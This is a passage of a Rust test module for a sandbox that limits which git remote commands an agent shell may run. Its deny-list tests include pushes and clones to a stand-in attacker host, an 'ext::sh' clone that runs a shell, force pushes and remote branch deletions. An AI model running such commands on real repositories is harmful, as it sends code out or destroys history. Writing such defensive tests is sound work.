        for needle in ["token", "password", "PRIVATE KEY", "helper="] {
            assert!(
                !joined
                    .to_ascii_lowercase()
                    .contains(&needle.to_ascii_lowercase()),
                "{joined}"
            );
        }
    }

    #[test]
    fn evidence_records_grant_host_and_operations_without_secrets() {
        let (_temp, grant) = workspace_with_remote();
        let evidence = grant.evidence();
        assert_eq!(evidence.grant, GIT_GRANT_ID);
        assert_eq!(evidence.remotes.len(), 1);
        assert_eq!(evidence.remotes[0].name, "origin");
        assert_eq!(evidence.remotes[0].transport, GitTransport::File);
        assert_eq!(
            evidence.remotes[0].operations,
            vec![GitOperationClass::Read, GitOperationClass::Write]
        );
        let json = serde_json::to_string(&evidence).unwrap();
        assert!(json.contains("\"grant\":\"host:sandbox-git-remotes\""));
        assert!(!json.contains("token"));
        assert!(!json.contains("secret"));
    }

    #[test]
    fn without_a_grant_network_git_is_denied_and_local_git_is_untouched() {
        for command in [
            "git clone https://git.example.test/org/repo.git",
            "git push origin main",
            "git -C repo fetch upstream",
            "git ls-remote https://git.example.test/org/repo.git",
            "git remote add origin https://git.example.test/org/repo.git",
            "sh -c 'git pull origin main'",
            "env git fetch origin",
        ] {
            let error = authorize_shell_command(command, None).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
        for command in [
            "git status",
            "git log --oneline -5",
            "git commit -m 'message'",
            "git config --get remote.origin.url",
            "cargo build",
            "echo git clone nope",
        ] {
            authorize_shell_command(command, None).unwrap();
        }
    }

    #[test]
    fn granted_remote_name_and_exact_url_are_accepted_but_others_are_denied() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            "git clone file:///workspace/remotes/origin.git",
            "git clone /workspace/remotes/origin.git work",
            "git fetch origin",
            "git pull origin main",
            "git push origin main",
            "git ls-remote origin",
            "git remote add backup file:///workspace/remotes/origin.git",
        ] {
            authorize_shell_command(command, Some(&grant)).unwrap_or_else(|error| {
                panic!("{command}: {error}");
            });
        }
        for command in [
            "git clone https://evil.example.test/repo.git",
            "git clone file:///workspace/remotes/other.git",
            "git fetch upstream",
            "git push https://evil.example.test/repo.git main",
            "git push $REMOTE main",
            "git fetch --all",
            "git remote update",
            "git clone ext::sh -c evil",
        ] {
            let error = authorize_shell_command(command, Some(&grant)).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
    }

    #[test]
    fn force_pushes_and_remote_ref_deletions_are_refused() {
        let (temp, grant) = workspace_with_remote();
        for command in [
            "git push --force origin main",
            "git push -f origin main",
            "git push origin +main",
            "git push --force-with-lease origin main",
            "git push --force-with-lease=main origin main",
            "git push --mirror origin",
            "git push --delete origin old-branch",
            "git push origin :old-branch",
            "git push --prune origin",
        ] {
            let error = authorize_shell_command(command, Some(&grant)).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
            assert!(error.to_string().contains("git-remotes"), "{error}");
        }
        // A normal push to the granted local remote actually works.
        let status = Command::new("git")
            .args(["init", "--bare", "-q"])
            .current_dir(temp.path().join("remotes/origin.git"))
            .status()
            .expect("git");
        assert!(status.success());
        authorize_shell_command("git push origin main", Some(&grant)).unwrap();
    }

    #[test]
    fn quotes_and_nested_shell_text_are_scanned_conservatively() {
        let (_temp, grant) = workspace_with_remote();
        authorize_shell_command(
            "echo 'git clone https://evil.example.test/repo.git'",
            Some(&grant),
        )
        .unwrap();
        for command in [
            "true && git push https://evil.example.test/repo.git main",
            "true; git push https://evil.example.test/repo.git main",
            "true | git clone https://evil.example.test/repo.git",
            "bash -lc \"git clone https://evil.example.test/repo.git\"",
            "bash -c 'git fetch upstream'",
        ] {
            assert!(
                authorize_shell_command(command, Some(&grant)).is_err(),
                "{command}"
            );
        }
        let error = authorize_shell_command("bash -c \"$SCRIPT\"", Some(&grant)).unwrap_err();
        assert!(error.to_string().contains("dynamic"), "{error}");
    }

    #[test]
    fn a_local_remote_clone_and_push_are_pinned_by_real_git() {
        static GIT: OnceLock<bool> = OnceLock::new();
        let has_git = *GIT.get_or_init(|| {
            Command::new("git")
                .arg("--version")
                .output()
                .is_ok_and(|output| output.status.success())
        });
        if !has_git {
            eprintln!("git not installed; skipping local remote pin");
            return;
        }
        let temp = tempfile::tempdir().unwrap();
        let workspace = temp.path().canonicalize().unwrap();
        let remote = workspace.join("remotes/origin.git");
        std::fs::create_dir_all(&remote).unwrap();
        let run = |dir: &Path, args: &[&str]| {
            let output = Command::new("git")
                .args(args)
                .current_dir(dir)
                .env("GIT_AUTHOR_NAME", "test")
                .env("GIT_AUTHOR_EMAIL", "test@example.test")
                .env("GIT_COMMITTER_NAME", "test")
                .env("GIT_COMMITTER_EMAIL", "test@example.test")
                .env("GIT_TERMINAL_PROMPT", "0")
                .output()
                .expect("git");
            assert!(
                output.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        };
        run(&remote, &["init", "--bare", "-q"]);
        run(
            &workspace,
            &["clone", "-q", remote.to_str().unwrap(), "work"],
        );
        let work = workspace.join("work");
        std::fs::write(work.join("README"), "hello\n").unwrap();
        run(&work, &["add", "README"]);
        run(&work, &["commit", "-q", "-m", "initial"]);
        run(&work, &["push", "-q", "origin", "HEAD:refs/heads/main"]);

        let host = GitGrantConfig::from_spec("origin=file:///workspace/remotes/origin.git")
            .unwrap()
            .unwrap();
        let grant =
            authorize_grant(&host, &[], &workspace, SandboxNetworkMode::ProxyEnforced).unwrap();
        // The container sees the virtual /workspace spelling; the host path
        // is a different spelling and stays refused (checked below).
        authorize_shell_command(
            "git clone /workspace/remotes/origin.git clone-two",
            Some(&grant),
        )
        .unwrap();
        assert!(
            authorize_shell_command(
                &format!("git clone {} clone-two", remote.display()),
                Some(&grant)
            )
            .is_err()
        );
        run(
            &workspace,
            &["clone", "-q", remote.to_str().unwrap(), "clone-two"],
        );
        assert!(workspace.join("clone-two/.git").is_dir());
        authorize_shell_command("git push origin main", Some(&grant)).unwrap();
        let heads = Command::new("git")
            .args(["rev-parse", "refs/heads/main"])
            .current_dir(&remote)
            .output()
            .expect("git");
        assert!(heads.status.success());
    }
}
